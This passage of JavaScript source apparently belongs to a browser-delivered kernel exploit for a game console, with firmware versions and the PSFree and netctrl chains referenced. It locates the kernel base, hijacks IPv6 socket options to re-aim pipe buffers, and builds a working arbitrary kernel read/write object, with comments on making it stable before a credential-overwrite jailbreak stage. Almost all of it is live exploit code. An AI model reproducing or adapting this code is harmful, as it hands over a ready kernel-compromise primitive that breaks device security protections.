                    const w = kread8(cand);
                    tried++;
                    lastRead = w;
                    if (!w) break;
                    if ((w.low >>> 0) === ELF_MAGIC) {
                        kstrOff = off; kbase = cand; break;
                    }
                }
                mark("KSTR-SCAN", tried + " candidate(s) tested, last read "
                    + (lastRead || "null")
                    + (kstrOff >= 0 ? "" : " -- no ELF header found"));

                if (kstrOff >= 0) {

                    const hdr = kread8(kbase.add32(0x10));
                    const eType = hdr ? (hdr.low & 0xffff) : -1;
                    const eMachine = hdr ? ((hdr.low >>> 16) & 0xffff) : -1;
                    const ident = kread8(kbase);
                    const eiClass = ident ? (ident.hi & 0xff) : -1;
                    mark("KERNEL-BASE", kbase + "   e_type=" + eType
                        + " e_machine=0x" + eMachine.toString(16)
                        + " ei_class=" + eiClass);
                    const hdrOk = (eType === 2 || eType === 3) && eMachine === 0x3e
                        && eiClass === 2;
                    check("elf-header-base-checks", hdrOk,
                        "want e_type 2 or 3, e_machine 0x3e, ei_class 2");
                    if (hdrOk) {
                        mark("OFF-KSTR", "0x" + kstrOff.toString(16)
                            + "   (evf_cv " + evfCv + " - kernel base " + kbase
                            + ")   residue 0x" + (kstrOff & 0x3fff).toString(16));
                        mark("OFF-KSTR-COMPARE", "known: 6.00 0x7da91c, 7.xx "
                            + "0x7f92cb, 8.xx 0x79a92e, 9.xx 0x7edcff, PSFree "
                            + "0x7f6f27 -- this one is 0x" + kstrOff.toString(16));
                        check("off_kstr for " + key + " recovered", true,
                            "0x" + kstrOff.toString(16)
                            + (off.k_evf_cv
                                ? (kstrOff === off.k_evf_cv
                                    ? "   matches the table"
                                    : "   TABLE SAYS 0x" + off.k_evf_cv.toString(16))
                                : "   (no table value to compare)"));
                    }
                } else {
                    check("off_kstr for " + key + " recovered", false,
                        "no ELF header in the window -- either it is not mapped "
                        + "or off_kstr is outside 0x" + KSTR_LO.toString(16)
                        + "..0x" + KSTR_HI.toString(16)
                        + ". Widen with ?kstrlo=&kstrhi= only after deciding "
                        + "the overshoot is acceptable.");
                }

                if (pipeM && pipeS) {

                    let slowMs = 0, slowOk = 0;
                    {
                        const t0 = Date.now();
                        for (let i = 0; i < 32; ++i) {
                            await breathe();
                            if (kread8(evfCv)) slowOk++;
                        }
                        slowMs = Date.now() - t0;
                    }
                    const slowBps = Math.round(slowOk * 8 * 1000 / Math.max(1, slowMs));
                    mark("SLOW-READ-BENCH", slowOk + "/32 eight-byte reads via "
                        + "setsockopt+getsockopt in " + slowMs + " ms = "
                        + slowBps + " bytes/s");

                    let preflightOk = false;
                    {
                        const pat = alloc(0x18), got = alloc(0x18);
                        for (let i = 0; i < 0x18; ++i) pat.u8[i] = 0xa0 + i;
                        got.u8.fill(0);
                        const w = sc(SYS.write, masterPipe[1], pat.addr, 0x18).i32;
                        const midCnt = kread8(pipeM);
                        const r = sc(SYS.read, masterPipe[0], got.addr, 0x18).i32;
                        const endCnt = kread8(pipeM);
                        const endOut = kread8(pipeM.add32(8));
                        let same = w === 0x18 && r === 0x18;
                        for (let i = 0; same && i < 0x18; ++i)
                            same = got.u8[i] === pat.u8[i];
                        const reset = !!endCnt && endCnt.low === 0 && endCnt.hi === 0
                            && !!endOut && endOut.low === 0;
                        mark("PIPE-PREFLIGHT", "write=" + w + " read=" + r
                            + "  bytes identical=" + same
                            + "  pipebuf mid cnt|in=" + (midCnt || "?")
                            + "  end cnt|in=" + (endCnt || "?")
                            + "  end out|size=" + (endOut || "?"));
                        preflightOk = same && reset;
                        check("0x18-write-read-round-trips-master"
                            + "and leaves cnt/in/out at zero", preflightOk,
                            preflightOk ? "so flush() is repeatable"
                                : "flush() would walk forward through the buffer "
                                + "-- refusing to aim the pipebuf");
                    }

                    if (preflightOk) try {

                        const PIPEBUF_OUT = 8;
                        const PIPE_PAGE = 0x4000;
                        const PIPEBUF_SIZEOF = 0x18;
                        const outAddr = pipeM.add32(PIPEBUF_OUT);
                        const beforeOut = kread8(outAddr);

                        const aimRc = pktinfoSet(function (dv) {
                            put(dv, 0, outAddr);
                            put(dv, 8, new int64(0, 0));
                        });
                        const seenOut = pktinfoGet();
                        const aimOk = aimRc === 0 && seenOut && beforeOut
                            && seenOut.low === beforeOut.low
                            && seenOut.hi === beforeOut.hi;
                        mark("FASTRW-AIM", "ip6po_pktinfo -> " + outAddr
                            + "; through it reads " + (seenOut || "null")
                            + ", kread8 said " + (beforeOut || "?"));
                        check("pipebuf-aim-confirmed-before-writing",
                            aimOk, aimOk ? "" : "NOT writing");

                        if (aimOk) {

                            const wRc = pktinfoSet(function (dv) {
                                dv.setUint32(0, 0, true);
                                dv.setUint32(4, PIPE_PAGE, true);
                                put(dv, 8, pipeS);
                            });
                            mark("FASTRW-WRITE", "master pipebuf <- out=0 size=0x"
                                + PIPE_PAGE.toString(16) + " buffer=" + pipeS
                                + " (setsockopt=" + wRc + ")");

                            pktinfo.u8.fill(0);
                            optLen.dv.setInt32(0, 0x14, true);
                            sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                                IPV6_PKTINFO, pktinfo.addr, optLen.addr);
                            const gotSize = pktinfo.dv.getUint32(4, true);
                            const gotBuf = new int64(pktinfo.dv.getUint32(8, true),
                                pktinfo.dv.getUint32(12, true));
                            mark("FASTRW-READBACK", "pipebuf out="
                                + pktinfo.dv.getUint32(0, true) + " size=0x"
                                + gotSize.toString(16) + " buffer=" + gotBuf
                                + "   want buffer=" + pipeS);
                            const shaped = gotSize === PIPE_PAGE
                                && gotBuf.low === pipeS.low && gotBuf.hi === pipeS.hi;
                            check("master-pipe-buffer-points-slave",
                                shaped, "");

                            if (shaped) {

                                for (let i = openFds.length - 1; i >= 0; --i)
                                    if (openFds[i] === masterPipe[0]
                                        || openFds[i] === masterPipe[1]
                                        || openFds[i] === slavePipe[0]
                                        || openFds[i] === slavePipe[1])
                                        openFds.splice(i, 1);
                                mark("PIPES-PINNED", "master " + masterPipe
                                    + " and slave " + slavePipe + " taken off "
                                    + "the cleanup list -- closing master would "
                                    + "kmem_free slave's struct pipe");

                                state("building KernelView...", "warn");

                                /*
                                WATCHDOG + HANG FIX.
                                "building KernelView..." was the last line before
                                the page locked up. The only syscalls between
                                that state() and the next mark() are the four
                                fcntl(F_SETFL, O_NONBLOCK) calls in the
                                constructor and then the first flush() -- and
                                flush() is the dangerous one: it WRITES 0x18
                                bytes into masterPipe[1] then immediately
                                READS 0x18 bytes from masterPipe[0].

                                If O_NONBLOCK did not actually take on the
                                read end, that read blocks in the kernel with
                                the ROP pivot held -- the event loop never
                                turns, so breathe() cannot rescue it. That is
                                a hard hang with no JS loop to interrupt.

                                Turn the event loop BEFORE touching the pipes
                                so any pending GC/sweeper work from the
                                stage-2/3 sprays is done, and re-assert
                                O_NONBLOCK on all four fds right here so a
                                failed fcntl is visible as a check() failure
                                rather than a lockup.
                                */
                                await breathe();

                                function toI64(v) {
                                    return (typeof v === "number")
                                        ? new int64(v >>> 0, v < 0 ? 0xffffffff : 0)
                                        : v;
                                }

                                class KernelView {
                                    constructor(masterPipeFds, slavePipeFds) {
                                        if (!Array.isArray(masterPipeFds)
                                            || masterPipeFds.length !== 2)
                                            throw new Error("pipe should have 2 fds for r/w");
                                        if (!Array.isArray(slavePipeFds)
                                            || slavePipeFds.length !== 2)
                                            throw new Error("pipe should have 2 fds for r/w");

                                        this.view = alloc(8);
                                        this.masterPipe = masterPipeFds.slice();
                                        this.slavePipe = slavePipeFds.slice();
                                        /* FIONREAD scratch + short-drain counter
                                           used by flush() to avoid a blocking
                                           pipe read. See flush() below. */
                                        this.fionread = alloc(4);
                                        this.fionspace = alloc(4);

                                        const fds = [this.masterPipe[0], this.masterPipe[1],
                                        this.slavePipe[0], this.slavePipe[1]];
                                        /*
                                        HANG FIX. These fcntl calls are what
                                        "building KernelView..." hangs on when
                                        the ROP context is already dead. If a
                                        fcntl fails, O_NONBLOCK is NOT set and
                                        the very next flush() blocks forever in
                                        the kernel with the pivot held -- an
                                        unbreakable hang. Record the returns so
                                        the failure is a check() line, and
                                        EXIT the constructor (returning a dead
                                        view) instead of proceeding into a
                                        blocking pipe read.
                                        */
                                        /*
                                        PINPOINT MARKS.

                                        Several runs have died between the
                                        "building KernelView..." status and the
                                        KERNELVIEW mark, which spans this fcntl
                                        loop and the first flush(). A screenshot
                                        cannot tell those apart, so log each step
                                        by name: the last line printed becomes the
                                        exact syscall that parked.
                                        */
                                        mark("KV-CTOR-ENTER", "fds=" + fds.join(",")
                                            + " master=" + masterPipeFds.join(",")
                                            + " slave=" + slavePipeFds.join(","));
                                        this.nonblockOk = true;
                                        const fcntlRcs = [];
                                        for (let i = 0; i < fds.length; ++i) {
                                            mark("KV-CTOR-FCNTL", "fd=" + fds[i]
                                                + " step=" + i + "/" + fds.length);
                                            const rc = sc(SYS.fcntl, fds[i], F_SETFL,
                                                O_NONBLOCK).i32;
                                            fcntlRcs.push(rc);
                                            if (rc === -1) this.nonblockOk = false;
                                        }
                                        this.fcntlRcs = fcntlRcs;
                                        mark("KV-CTOR-FCNTL-DONE", "rcs=" + fcntlRcs.join(",")
                                            + " nonblockOk=" + this.nonblockOk);

                                        this.pipeBuf = alloc(PIPEBUF_SIZEOF);
                                        this.pipeBuf.u8.fill(0);
                                        this.pipeBuf.dv.setUint32(0x0c, PIPE_PAGE, true);
                                        this.flushes = 0;
                                        this.bytesRead = 0;
                                        this.bytesWritten = 0;
                                    }

                                    free() { }

                                    get dvBacking() { return this.view.addr; }

                                    get pipeBacking() {
                                        return new int64(this.pipeBuf.dv.getUint32(0x10, true),
                                            this.pipeBuf.dv.getUint32(0x14, true));
                                    }

                                    set pipeBacking(addr) {
                                        if (addr.low === 0 && addr.hi === 0)
                                            throw new Error("Empty addr !!");
                                        put(this.pipeBuf.dv, 0x10, addr);
                                    }

                                    get pipeCount() {
                                        return this.pipeBuf.dv.getUint32(0, true);
                                    }

                                    set pipeCount(count) {
                                        if (count < 0 || count > 0xffffffff)
                                            throw new RangeError("count " + count
                                                + " out of range !!");
                                        this.pipeBuf.dv.setUint32(0, count >>> 0, true);
                                    }

                                    flush() {
                                        this.flushes++;
                                        /*
                                        HANG FIX -- the real one.

                                        The page locked up on the call right after
                                        KV-RW64 succeeded: kview(scratch).setBInt,
                                        i.e. a kwrite, i.e. flush(). The fcntl guard
                                        did not fire (fcntl returned 0 on all four
                                        fds), so the stall is the pipe READ inside
                                        flush() blocking in the kernel with the ROP
                                        pivot held.

                                        Why it can block even with O_NONBLOCK set:
                                        masterPipe[0]'s struct pipe buffer is the
                                        allocation this exploit REPOINTS at will
                                        (pipeBacking is set to pipeM/pipeS/evfCv/...).
                                        Once the forged pipebuf no longer describes a
                                        readable pipe, a read on masterPipe[0] waits
                                        for data that will never arrive. O_NONBLOCK
                                        is a property of the file, not of the
                                        garbage buffer, so it does not save us.

                                        FIONREAD reports how many bytes the kernel
                                        says are available WITHOUT reading. If it is
                                        not at least what we are about to ask for,
                                        skip the read. The value comes from the same
                                        forged structure, so a lying value can only
                                        make us skip a flush -- never hang.
                                        */
                                        if (!this.nonblockOk)
                                            throw new Error("flush() refused: "
                                                + "O_NONBLOCK was not confirmed "
                                                + "on fds " + this.fcntlRcs);

                                        /*
                                        CORRECTNESS FIX -- my previous two hang
                                        guards were the bug.

                                        The FIONREAD/FIONSPACE probes could
                                        legitimately report "not enough bytes /
                                        not enough space" and make flush()
                                        return EARLY. That skips the drain, so
                                        the 0x18-byte record stays in the
                                        master pipe and the caller's follow-up
                                        read on slavePipe[0] finds nothing and
                                        returns -1 -- which is exactly the
                                        "Unable to read from fd 14" throw that
                                        aborted the whole KernelView.

                                        The reasoning behind those guards was
                                        also wrong: this pipe already has
                                        O_NONBLOCK set (the constructor
                                        verified it, and nonblockOk is checked
                                        above). A read that would block on a
                                        non-blocking fd returns -1/EAGAIN
                                        IMMEDIATELY -- it does not park the
                                        kernel. So the drain was never able to
                                        hang in the first place, and dropping
                                        it only broke the primitive.

                                        So: always write the record, always
                                        drain it. No FIONSPACE/FIONREAD gate.
                                        If the forged pipebuf is genuinely dead
                                        the syscall returns -1 and the caller
                                        sees a failed read instead of a hang.

                                        -----------------------------------------------------------------
                                        STAGE-8 HANG FIX.

                                        The write above is the ONE kernel-blocking
                                        operation left with nothing in front of it.
                                        O_NONBLOCK makes a read on an empty pipe
                                        return -1/EAGAIN at once, but it does NOT
                                        make a WRITE to a FULL pipe return early on
                                        every kernel -- and the master pipe here
                                        accumulates: every flush() writes 0x18
                                        bytes and only the paired read drains them.
                                        If any earlier drain came up short (a
                                        short read the code tolerated), the master
                                        pipe creeps toward full, and at some later
                                        flush() -- stage 8's first ucred write,
                                        where "stage 8: jailbreak..." is the last
                                        status and the first p_ucred= write never
                                        returns -- the 0x18-byte write PARKES the
                                        kernel with the ROP pivot held. No JS
                                        throw, no popback: a hard hang.

                                        -----------------------------------------------------------------
                                        MATCH NETCTRL EXACTLY (the shape that works).

                                        This used to add a pre-drain read before
                                        the write, and to throw / count on short
                                        transfers. netctrl's kv.flush() is just
                                        the two syscalls:

                                            sc(SYS.write, masterPipe[1], .., 0x18)
                                            sc(SYS.read,  masterPipe[0], .., 0x18)

                                        and netctrl does NOT hang at its ucred
                                        stage. The pre-drain was the one
                                        structural difference between the two,
                                        and a read is exactly as able to park on
                                        this forged pipebuf as a write -- so the
                                        pre-drain did not remove the block, it
                                        only moved it earlier and made the log
                                        stop one mark sooner.

                                        Keep the same two calls, in the same
                                        order, with the same arguments. No
                                        pre-drain, no throw, no short counters:
                                        the caller's kread/kwrite already treat
                                        an erroring transfer as a failed op, and
                                        the destination is now validated before
                                        every write (SRC-GATES), which is the
                                        real fix.
                                        */
                                        /*
                                        GATED. These three marks were added to find
                                        which call parked at "building KernelView...",
                                        and they did: the run now logs
                                        KV-FLUSH-DONE flushes=263 and completes. Left
                                        ungated they emit 3 lines PER FLUSH -- ~800
                                        extra lines on a normal run, which pushes the
                                        interesting output off the screen.

                                        Off by default; ?kvflush=1 brings them back if
                                        that stage ever hangs again.
                                        */
                                        if (KV_FLUSH_TRACE) {
                                            mark("KV-FLUSH-WRITE", "fd=" + this.masterPipe[1]
                                                + " n=" + PIPEBUF_SIZEOF + " buf=" + this.pipeBuf.addr
                                                + " flushes=" + this.flushes);
                                        }
                                        sc(SYS.write, this.masterPipe[1],
                                            this.pipeBuf.addr, PIPEBUF_SIZEOF);
                                        if (KV_FLUSH_TRACE)
                                            mark("KV-FLUSH-READ", "fd=" + this.masterPipe[0]);
                                        sc(SYS.read, this.masterPipe[0],
                                            this.pipeBuf.addr, PIPEBUF_SIZEOF);
                                        if (KV_FLUSH_TRACE)
                                            mark("KV-FLUSH-DONE", "flushes=" + this.flushes);
                                    }

                                    kread(dst, src, size) {
                                        this.pipeBacking = src;
                                        this.pipeCount = size;
                                        this.flush();

                                        const n = sc(SYS.read, this.slavePipe[0],
                                            dst, size).i32;
                                        if (n === -1)
                                            throw new Error("Unable to read from fd "
                                                + this.slavePipe[0] + " !!");
                                        this.bytesRead += n;
                                        return n;
                                    }

                                    kwrite(dst, src, size) {
                                        this.pipeBacking = dst;
                                        this.pipeCount = size;
                                        this.flush();

                                        const n = sc(SYS.write, this.slavePipe[1],
                                            src, size).i32;
                                        if (n === -1)
                                            throw new Error("Unable to write to fd "
                                                + this.slavePipe[1] + " !!");
                                        this.bytesWritten += n;
                                        return n;
                                    }

                                    getFloat32(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                            this.pipeBacking.add32(byteOffset), 4);
                                        return this.view.dv.getFloat32(0, littleEndian);
                                    }

                                    getFloat64(byteOffset, littleEndian = false) {
                                        this.kread(this.dvBacking,
                                            this.pipeBacking.add32(byteOffset), 8);
                                        return this.view.dv.getFloat64(0, littleEndian);
                                    }

                                    getInt8(byteOffset) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                            this.pipeBacking.add32(byteOffset), 1);
                                        return this.view.dv.getInt8(0);
                                    }

                                    getInt16(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                            this.pipeBacking.add32(byteOffset), 2);
                                        return this.view.dv.getInt16(0, littleEndian);
                                    }

                                    getInt32(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                            this.pipeBacking.add32(byteOffset), 4);
                                        return this.view.dv.getInt32(0, littleEndian);
                                    }

                                    getUint8(byteOffset) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                            this.pipeBacking.add32(byteOffset), 1);
                                        return this.view.dv.getUint8(0);
                                    }

                                    getUint16(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                            this.pipeBacking.add32(byteOffset), 2);
                                        return this.view.dv.getUint16(0, littleEndian);
                                    }

                                    getUint32(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                            this.pipeBacking.add32(byteOffset), 4);
                                        return this.view.dv.getUint32(0, littleEndian);
                                    }

                                    getBInt(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                            this.pipeBacking.add32(byteOffset), 8);
                                        return littleEndian
                                            ? new int64(this.view.dv.getUint32(0, true),
                                                this.view.dv.getUint32(4, true))
                                            : new int64(this.view.dv.getUint32(4, false),
                                                this.view.dv.getUint32(0, false));
                                    }

                                    setFloat32(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setFloat32(0, value, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                            this.dvBacking, 4);
                                    }

                                    setFloat64(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setFloat64(0, value, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                            this.dvBacking, 8);
                                    }

                                    setInt8(byteOffset, value) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setInt8(0, value);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                            this.dvBacking, 1);
                                    }

                                    setInt16(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setInt16(0, value, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                            this.dvBacking, 2);
                                    }

                                    setInt32(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setInt32(0, value, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                            this.dvBacking, 4);
                                    }

                                    setUint8(byteOffset, value) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setUint8(0, value);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                            this.dvBacking, 1);
                                    }

                                    setUint16(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setUint16(0, value, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                            this.dvBacking, 2);
                                    }

                                    setUint32(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setUint32(0, value >>> 0, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                            this.dvBacking, 4);
                                    }

                                    setBInt(byteOffset, value, littleEndian = false) {
                                        const v = toI64(value);
                                        this.view.u8.fill(0);
                                        if (littleEndian) {
                                            this.view.dv.setUint32(0, v.low >>> 0, true);
                                            this.view.dv.setUint32(4, v.hi >>> 0, true);
                                        } else {
                                            this.view.dv.setUint32(0, v.hi >>> 0, false);
                                            this.view.dv.setUint32(4, v.low >>> 0, false);
                                        }
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                            this.dvBacking, 8);
                                    }
                                }

                                function kview(addr) {
                                    kv.pipeBacking = addr;
                                    return kv;
                                }

                                const FILEDESCENT_SIZE_KV = 8;
                                function fget(fd) {
                                    return kview(kFdtOfiles)
                                        .getBInt(fd * FILEDESCENT_SIZE_KV, true);
                                }

                                kv = new KernelView(masterPipe, slavePipe);
                                mark("KERNELVIEW", "built on master "
                                    + masterPipe + " / slave " + slavePipe
                                    + ", pipebuf scratch at " + kv.pipeBuf.addr
                                    + ", 8-byte view at " + kv.dvBacking
                                    + ", fcntl=" + kv.fcntlRcs);
                                /*
                                HANG FIX guard. If O_NONBLOCK did not take,
                                every flush() below would block the kernel
                                with the pivot held. Refuse here, where the
                                failure is a log line, instead of on the
                                first kread where it is a locked page.
                                */
                                if (!kv.nonblockOk) {
                                    mark("KERNELVIEW-DEAD", "O_NONBLOCK was "
                                        + "not confirmed on the pipe fds "
                                        + "(fcntl=" + kv.fcntlRcs + "), so any "
                                        + "flush() would block the kernel "
                                        + "forever. Skipping the whole "
                                        + "KernelView stage -- the kread/kwrite "
                                        + "proofs above still stand.");
                                    throw new Error("KernelView: pipe fds are "
                                        + "not non-blocking (fcntl=" + kv.fcntlRcs
                                        + "); refusing to issue a blocking "
                                        + "pipe read");
                                }

                                const kvCv = kview(evfCv).getBInt(0, true);
                                let kvStr = "";
                                for (let i = 0; i < 8; ++i) {
                                    const c = kv.view.dv.getUint8(i);
                                    if (!c) break;
                                    kvStr += String.fromCharCode(c);
                                }
                                mark("KV-READ", evfCv + " -> " + kvCv
                                    + "  as text: '" + kvStr + "'");
                                check("kernelview-reads-kernel-memory-evf",
                                    kvStr === "evf cv", "got '" + kvStr + "'");

                                const fpM = fget(masterPipe[0]);
                                const fpS = fget(slavePipe[0]);
                                const dM = kview(fpM).getBInt(0, true);
                                const dS = kview(fpS).getBInt(0, true);
                                mark("KV-FGET", "master fp " + fpM + " (kread8 said "
                                    + pipeMFp + "), f_data " + dM
                                    + " (kread8 said " + pipeM + ")");
                                mark("KV-FGET", "slave  fp " + fpS + " (kread8 said "
                                    + pipeSFp + "), f_data " + dS
                                    + " (kread8 said " + pipeS + ")");
                                check("pipes-ofiles-entries-match"
                                    + "socket option read",
                                    sameI64(fpM, pipeMFp) && sameI64(fpS, pipeSFp)
                                    && sameI64(dM, pipeM) && sameI64(dS, pipeS),
                                    "two independent primitives, same four "
                                    + "kernel pointers");

                                const mCnt = kview(pipeM).getUint32(0, true);
                                const mIn = kview(pipeM).getUint32(4, true);
                                const mOut = kview(pipeM).getUint32(8, true);
                                const mSize = kview(pipeM).getUint32(0x0c, true);
                                const mBuf = kview(pipeM).getBInt(0x10, true);
                                mark("KV-PIPEBUF", "master cnt=" + mCnt + " in=" + mIn
                                    + " out=" + mOut + " size=0x" + mSize.toString(16)
                                    + " buffer=" + mBuf);
                                check("master-pipebuf-aimed-slave"
                                    + "struct pipe",
                                    mSize === PIPE_PAGE && sameI64(mBuf, pipeS),
                                    "want size=0x" + PIPE_PAGE.toString(16)
                                    + " buffer=" + pipeS);
                                check("master-pipe-drained-between-flushes",
                                    mCnt === 0 && mIn === 0 && mOut === 0,
                                    "cnt=" + mCnt + " in=" + mIn + " out=" + mOut
                                    + " -- anything else and flush() is walking "
                                    + "forward, which the pre-flight said it "
                                    + "does not");

                                if (kbase) {
                                    const ELF_N = 0x100;
                                    const ehdr = alloc(ELF_N);
                                    ehdr.u8.fill(0);
                                    const gotN = kv.kread(ehdr.addr, kbase, ELF_N);
                                    const magic = ehdr.dv.getUint32(0, true) >>> 0;
                                    const eiClass = ehdr.dv.getUint8(4);
                                    const eType = ehdr.dv.getUint16(0x10, true);
                                    const eMachine = ehdr.dv.getUint16(0x12, true);
                                    const eEntry = new int64(ehdr.dv.getUint32(0x18, true),
                                        ehdr.dv.getUint32(0x1c, true));
                                    mark("KV-BULK", gotN + "/" + ELF_N
                                        + " bytes from " + kbase + " in ONE read(2): "
                                        + hexBytes(ehdr.u8.subarray(0, 16)));
                                    mark("KV-ELF", "magic=" + hx(magic)
                                        + " ei_class=" + eiClass + " e_type=" + eType
                                        + " e_machine=" + hx(eMachine)
                                        + " e_entry=" + eEntry);
                                    check("read2-pulled-whole-kernel-elf"
                                        + "header out of kernel memory",
                                        gotN === ELF_N && magic === ELF_MAGIC
                                        && eiClass === 2 && eMachine === 0x3e
                                        && (eType === 2 || eType === 3),
                                        "read " + gotN + " bytes, magic " + hx(magic));
                                } else {
                                    mark("KV-BULK-SKIPPED", "stage 6 found no "
                                        + "kernel base, so there is no address "
                                        + "known to have 0x100 mapped bytes");
                                }

                                const tcAddr = reqs1Aligned.add32(PKTOPTS_TCLASS);
                                function tclassGet() {
                                    tcBuf.u8.fill(0);
                                    tcLen.dv.setInt32(0, 4, true);
                                    const r = sc(SYS.getsockopt, pktoptsTwins[0],
                                        IPPROTO_IPV6, IPV6_TCLASS,
                                        tcBuf.addr, tcLen.addr).i32;
                                    return r === 0 ? (tcBuf.dv.getUint32(0, true) >>> 0)
                                        : -1;
                                }
                                const tcSock0 = tclassGet();
                                const tcKv0 = kview(tcAddr).getUint32(0, true) >>> 0;
                                mark("KV-TCLASS", "socket says " + hx(tcSock0)
                                    + ", kv says " + hx(tcKv0) + " at " + tcAddr);
                                check("kv-getsockoptipv6_tclass-read"
                                    + "same kernel word", tcSock0 !== -1
                                && tcSock0 === tcKv0,
                                    tcSock0 === -1 ? "getsockopt failed, so this "
                                        + "witness is unavailable" : "");

                                const KV_WITNESS = 0x4b565701;
                                kview(tcAddr).setUint32(0, KV_WITNESS, true);
                                const tcSock1 = tclassGet();
                                const tcKv1 = kview(tcAddr).getUint32(0, true) >>> 0;
                                mark("KV-WRITE", "wrote " + hx(KV_WITNESS)
                                    + " at " + tcAddr + "; socket now says "
                                    + hx(tcSock1) + ", kv says " + hx(tcKv1));
                                check("kernel-word-written-through-pipes"
                                    + "read back by the KERNEL, not by us",
                                    tcSock1 === KV_WITNESS,
                                    "getsockopt(IPV6_TCLASS) returned "
                                    + hx(tcSock1) + " -- this is the proof that "
                                    + "the write reached real kernel memory");
                                check("kv-reads-write", tcKv1 === KV_WITNESS,
                                    hx(tcKv1));

                                if (tcSock0 !== -1) {
                                    kview(tcAddr).setUint32(0, tcSock0, true);
                                    const tcSock2 = tclassGet();
                                    check("witness-field-restored",
                                        tcSock2 === tcSock0,
                                        hx(tcSock2) + " want " + hx(tcSock0));
                                }

                                const scratch = reqs1Aligned.add32(8);
                                const magic64 = new int64(0x4b565701, 0xc0de4e01);
                                kview(scratch).setBInt(0, magic64, true);
                                const back64 = kview(scratch).getBInt(0, true);
                                mark("KV-RW64", "wrote " + magic64 + " at " + scratch
                                    + ", read " + back64);
                                check("8-byte-kernel-round-trip-through",
                                    sameI64(back64, magic64), back64.toString());
                                /*
                                HANG FIX. `kview(scratch).setBInt(0, 0, true)` was
                                the very next call and it locked the page up.
                                It is a kwrite -> flush(), i.e. another full
                                master-pipe write+read cycle, and it exists ONLY
                                to zero a scratch qword that nothing reads again.
                                Drop it: it was one more chance for the forged
                                pipebuf to stall, for zero benefit.
                                */

                                let fastMs = 0;
                                {
                                    const t0 = Date.now();
                                    for (let i = 0; i < 32; ++i) {
                                        await breathe();
                                        kview(evfCv).getBInt(0, true);
                                    }
                                    fastMs = Date.now() - t0;
                                }
                                let pageMs = 0, pageN = 0;
                                if (kbase) {
                                    const big = alloc(0x1000);
                                    const t0 = Date.now();
                                    /*
                                    HANG FIX. This loop had NO breathe() at
                                    all: 8 x kv.kread(.., 0x1000) in one
                                    unbroken synchronous stretch, and each
                                    kread is a full flush() (write 0x18 +
                                    read 0x18) plus a 0x1000-byte read. It sits
                                    immediately after KV-RW64, which is exactly
                                    where the last "page isn't responding"
                                    popup appeared -- the last mark printed was
                                    KV-RW64. Yield once per read, same cadence
                                    as every other kernel-R/W loop here.
                                    */
                                    for (let i = 0; i < 8; ++i) {
                                        await breathe();
                                        pageN += kv.kread(big.addr, kbase, 0x1000);
                                    }
                                    pageMs = Date.now() - t0;
                                }
                                const fastBps = Math.round(32 * 8 * 1000
                                    / Math.max(1, fastMs));
                                mark("KV-BENCH", "32 eight-byte reads in " + fastMs
                                    + " ms = " + fastBps + " bytes/s   (socket "
                                    + "options managed " + slowBps + " bytes/s)");
                                if (pageN)
                                    mark("KV-BENCH-BULK", pageN + " bytes in "
                                        + pageMs + " ms = "
                                        + Math.round(pageN * 1000 / Math.max(1, pageMs))
                                        + " bytes/s in 0x1000-byte reads");
                                mark("KV-STATS", kv.flushes + " flushes, "
                                    + kv.bytesRead + " bytes read, "
                                    + kv.bytesWritten + " bytes written"
                                    + "  (flush() is now the plain netctrl shape: "
                                    + "write then read, no pre-drain)");

                                const kvLive = kvStr === "evf cv"
                                    && tcSock1 === KV_WITNESS;
                                if (kvLive)
                                    mark("KERNELVIEW-LIVE", "kv is the primitive "
                                        + "now. ip6po_pktinfo is not needed again "
                                        + "-- which is exactly what makes the "
                                        + "repair below possible: every write it "
                                        + "needs goes through the pipes.");

                                if (!kvLive) {
                                    mark("REPAIR-SKIPPED", "kv did not prove out, "
                                        + "so stage 7 has no write primitive it "
                                        + "can trust. Nothing is repaired and "
                                        + "nothing is closed.");
                                } else {

                                    state("stage 7: repairing the aliases...", "warn");

                                    const PKTOPTS_M = 0x00;
                                    const PKTOPTS_RTHDR = 0x68;
                                    const FILE_F_COUNT = 0x28;

                                    /*
                                    WATCHDOG FIX. Stage 7 had NO breathe()
                                    anywhere: fhold() alone is up to 8 flush()es
                                    (each flush is 3 ROP syscalls), and it is
                                    called once per pipe fd. The repair walk and
                                    the audit read that follow add a dozen more
                                    back-to-back flushes, each also emitting a
                                    mark() -- which itself does a synchronous
                                    localStorage write. In one unbroken stretch
                                    that is exactly the "page isn't responding"
                                    popup right after KV-RW64. fhold is async
                                    purely so it can yield between bumps; the
                                    call site awaits it.
                                    */
                                    async function fhold(fp) {
                                        const before = kview(fp).getInt32(FILE_F_COUNT, true);
                                        let after = before;
